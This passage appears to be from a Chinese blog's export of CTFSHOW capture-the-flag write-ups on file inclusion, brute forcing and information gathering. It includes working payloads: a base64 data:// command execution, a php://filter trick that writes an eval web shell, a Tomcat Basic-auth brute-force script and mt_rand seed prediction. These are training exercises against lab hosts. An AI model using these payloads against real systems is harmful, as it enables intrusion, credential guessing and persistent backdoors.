class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用<code>data://</code>伪协议，base64编码后的<code>=</code>去掉</p><p>payload</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbDBnLnBocCcpPz4</span></span><br></pre></td></tr></table></figure><h1 id="web116"><a href="#web116" class="headerlink" title="web116()"></a>web116()</h1><p>打开后发现是段视频，提供了下载功能，先下载下来，用010打开后没什么特殊的发现，因为提示说有misc的知识点，尝试一下文件文件分离</p><p>利用命令<code>foremost 下载.mp4</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116.png" alt=""></p><p>分离成功，并且发现存在png文件</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116_01.png" alt=""></p><p>发现png文件是一段代码</p><p>代码过滤了一些特殊字符串</p><p>尝试传参<code>?file=flag.php</code></p><p>发现视频打不开了，且没什么信息，尝试抓个包看看</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116_03.png" alt=""></p><p>拿到flag</p><p><code>payload: ?file=flag.php</code></p><h1 id="web117"><a href="#web117" class="headerlink" title="web117()"></a>web117()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>直接给源码了，又是一个<code>die</code>死亡绕过，但是把<code>base64</code>和<code>rot13</code>过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用<span class="title function_ invoke__">iconv</span>()函数处理流数据有等同作用</span><br><span class="line"><span class="title function_ invoke__">iconv</span> ( <span class="keyword">string</span> <span class="variable">$in_charset</span> , <span class="keyword">string</span> <span class="variable">$out_charset</span> , <span class="keyword">string</span> <span class="variable">$str</span> )：将字符串 <span class="variable">$str</span> 从in_charset编码转换到 <span class="variable">$out_charset</span></span><br><span class="line">这里引入usc-<span class="number">2</span>的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</span><br></pre></td></tr></table></figure><p>没有ban php 所以可以直接用</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-爆破</title>
      <link href="/2023/08/09/CTFSHOW-%E7%88%86%E7%A0%B4/"/>
      <url>/2023/08/09/CTFSHOW-%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web21-tomcat"><a href="#web21-tomcat" class="headerlink" title="web21(tomcat)"></a>web21(tomcat)</h1><p>打开后发现是常规爆破tomcat，正常写脚本爆破就行</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/baopo.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1f0f98a8-347f-4c6b-bef6-1fdf6f595916.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetPayload</span>(<span class="params">passwd</span>):</span><br><span class="line">    Payload = <span class="string">&quot;admin:&quot;</span>+passwd</span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(Payload.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFlag</span>(<span class="params">url,Payload</span>):</span><br><span class="line">    Payload_Last = <span class="string">&quot;Basic &quot;</span>+Payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Payload_Last</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64decode(Payload).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        passwd = line.split()[-<span class="number">1</span>]</span><br><span class="line">        Payload = GetPayload(passwd)</span><br><span class="line">        GetFlag(url,Payload)</span><br></pre></td></tr></table></figure><h1 id="web22-子域名"><a href="#web22-子域名" class="headerlink" title="web22(子域名)"></a>web22(子域名)</h1><blockquote><p>域名失效了</p></blockquote><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/baopo_01.png" alt=""></p><h1 id="web23-MD5"><a href="#web23-MD5" class="headerlink" title="web23(MD5)"></a>web23(MD5)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果md5加密后的第一位=第14位=第17位 and  第1位+第14位+第17位除以第1位等于第31位就输出flag</span></span><br></pre></td></tr></table></figure><p>写爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        url=<span class="string">&quot;http://23bb7e6a-3533-4bc7-b6f8-f5108b9ac2c0.challenge.ctf.show/?token=&quot;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)</span><br><span class="line">        req=requests.get(url=url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(req)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="web24-伪随机数"><a href="#web24-伪随机数" class="headerlink" title="web24(伪随机数)"></a>web24(伪随机数)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mt_srand() //播种 Mersenne Twister 随机数生成器。<br>mt_rand() //生成随机数<br>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数<br>当种子不变时，实际上生成的随机数是固定的。而这就是伪随机数漏洞</p></blockquote><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 1155388967</span></span><br></pre></td></tr></table></figure><p>传参，得到flag</p><h1 id="web25-伪随机数plus"><a href="#web25-伪随机数plus" class="headerlink" title="web25(伪随机数plus)"></a>web25(伪随机数plus)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>题目要求我们向服务器传输一个参数<code>r</code>,程序将flag用md5加密后，取前8位作为种子，用<code>mt_srand()</code>函数生成一个随机数，然后将两者相减，将结果赋值给<code>$rand</code>，如果<code>$rand</code>等于0，那么检查<code>cookie</code>中的<code>token</code>是否等于两个<code>mt_srand()</code> 的和，如果是，则输出flag。如果<code>$rand</code>不等于0，则输出$rand</p></blockquote><p>因为<code>mt_srand()</code>的种子是用<code>flag</code>生成的，我们无法直接预测<code>mt_srand()</code>的输出</p><p>可使用<code>php_mt_seed</code>工具进行种子爆破</p><ul><li><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a></li></ul><p>先向服务器传输r=0，得到第一个mt_srand()的值：-1072139268（随机生成）</p><p>在kali中使用php_mt_seed工具，首先输入make后就可正常使用</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25.png" alt=""></p><p>再通过抓包工具找到php版本</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25_01.png" alt=""></p><p>发现爆破处的php版本7.1.0+有很多个，将每个种子都记录下来</p><blockquote><p>490065111</p><p>490266778</p><p>2212201099</p><p>2869436065</p><p>3656704041</p></blockquote><p>用这个种子写一个php测试脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">490065111</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;===&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将每个种子生成的数据都记录下来</p><blockquote><p>1072139268===1800873081</p><p>1072139268===3379721082</p><p>1072139268===1603006468</p><p>1072139268===3077457061</p><p>1072139268===2163793481</p></blockquote><p>第一个数据是<code>r</code>的值，第二个数据是<code>Cookie</code>的值，进行实验</p><p>在第四个的时候得到flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25_02.png" alt=""></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26(?)"></a>web26(?)</h1><p>emmm，有点没看懂，在安装界面抓了个包，随手一发，就得到了flag</p><p><img src="" alt=""><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/26.png" alt="26"></p><h1 id="web27-日期"><a href="#web27-日期" class="headerlink" title="web27(日期)"></a>web27(日期)</h1><p>在录取名单中，发现可能有用的信息</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27.png" alt=""></p><p>在学籍登陆界面发现可以进行爆破的地方</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_01.png" alt=""></p><p>尝试爆破，先打断点</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_02.png" alt=""></p><p>设置Payload</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_03.png" alt=""></p><p>得到结果</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_04.png" alt=""></p><p>登陆成功，获得信息</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_05.png" alt=""></p><p>拿去解码一下</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_06.png" alt=""></p><p>登录，获得flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_07.png" alt=""></p><h1 id="web28-目录"><a href="#web28-目录" class="headerlink" title="web28(目录)"></a>web28(目录)</h1><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28.png" alt=""></p><p>猜测为爆破目录，将2.txt删掉进行爆破</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_01.png" alt=""></p><p>设置Payload，将两个数值都设置1-100</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_02.png" alt=""></p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_03.png" alt=""></p><p>爆破成功，得到flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_04.png" alt=""></p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_05.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-信息搜集</title>
      <link href="/2023/08/09/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2023/08/09/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web1-源码"><a href="#web1-源码" class="headerlink" title="web1(源码)"></a>web1(源码)</h1><p>页面没什么有用的信息，查看源码，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png" alt=""></p><h1 id="web2-js"><a href="#web2-js" class="headerlink" title="web2(js)"></a>web2(js)</h1><p>利用插件禁用js，查看源码，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png" alt=""></p><h1 id="web3-BurpSuite"><a href="#web3-BurpSuite" class="headerlink" title="web3(BurpSuite)"></a>web3(BurpSuite)</h1><p>打开页面什么也没有，查看源码也没有什么信息</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png" alt=""></p><p>根据提示，利用burpsuite抓包并重新发送，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3_01.png" alt=""></p><h1 id="web4-robots-txt"><a href="#web4-robots-txt" class="headerlink" title="web4(robots.txt)"></a>web4(robots.txt)</h1><p>打开页面，发现没什么提示，源码也没有什么信息，根据提示，访问<code>robots.txt</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4.png" alt=""></p><p>发现flag文件，访问，成功得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4_01.png" alt=""></p><h1 id="web5-phps源码泄露"><a href="#web5-phps源码泄露" class="headerlink" title="web5(phps源码泄露)"></a>web5(phps源码泄露)</h1><p>可以拿扫目录软件进行扫描</p><p>访问<code>index.phps</code>下载源码，查看发现flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/5.png" alt=""></p><h1 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6(www.zip)"></a>web6(www.zip)</h1><p>正常扫目录，发现文件</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6.png" alt=""></p><p>下载，查看</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6_01.png" alt=""></p><p>访问<code>fl000g.txt</code>文件得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6_02.png" alt=""></p><h1 id="web7-git"><a href="#web7-git" class="headerlink" title="web7(.git)"></a>web7(.git)</h1><p>依旧没什么有用的信息，扫目录</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7.png" alt=""></p><p>访问<code>.git</code>，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7_01.png" alt=""></p><h1 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8(.svn)"></a>web8(.svn)</h1><p>扫目录，发现<code>.svn</code>文件，可知为SVN泄露</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8.png" alt=""></p><p>访问一下<code>.svn</code>，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8_01.png" alt=""></p><h1 id="web9-vim备份文件"><a href="#web9-vim备份文件" class="headerlink" title="web9(vim备份文件)"></a>web9(vim备份文件)</h1><p>扫目录、发现没什么信息</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9.png" alt=""></p><p>根据提示，发现为vim备份文件</p><p>尝试访问<code>index.php.swp</code>，文件下载成功，查看，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9_01.png" alt=""></p><h1 id="web10-Cookie"><a href="#web10-Cookie" class="headerlink" title="web10(Cookie)"></a>web10(Cookie)</h1><p>根据提示，猜测Cookie可能有东西，抓包试试，发现flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/10.png" alt=""></p><h1 id="web11-域名解析"><a href="#web11-域名解析" class="headerlink" title="web11(域名解析)"></a>web11(域名解析)</h1><p> 根据提示，发现需要域名解析</p><p><a href="http://dbcha.com/">域名解析查询</a></p><p>设置相应记录，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/11.png" alt=""></p><h1 id="web12"><a href="#web12" class="headerlink" title="web12()"></a>web12()</h1><p>没什么思路，尝试访问一下<code>robots.txt</code>，发现存在<code>/admin</code>目录</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12.png" alt=""></p><p>访问发现需要用户名和密码</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_01.png" alt=""></p><p>根据提示，查看网站，寻找密码，发现疑似密码的位置</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_02.png" alt=""></p><p>尝试登录，登陆成功，得到flag（admin/372619038）</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_03.png" alt=""></p><h1 id="web13"><a href="#web13" class="headerlink" title="web13()"></a>web13()</h1><p>根据提示，寻找技术文档</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13.png" alt=""></p><p>点击查看，发现后台登陆地址，用户名及密码</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13_01.png" alt=""></p><p>直接登录，将<code>your-domain</code>换成靶场环境ip，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13_02.png" alt=""></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14()"></a>web14()</h1><p>根据提示，发现需要寻找<code>editor</code>，尝试访问<code>/editor</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14.png" alt=""></p><p>发现在文件上传的地方，能够查看目录</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14_01.png" alt=""></p><p>查询目录发现存在文件<code>nothinghere/fl000g.txt</code>，直接访问，得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14_02.png" alt=""></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15()"></a>web15()</h1><p>提示说邮箱可能造成信息泄露，我们去寻找一下邮箱</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15.png" alt=""></p><p>访问admin页面</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_01.png" alt=""></p><p>点击忘记密码，发现需要提供所在地城市名</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_02.png" 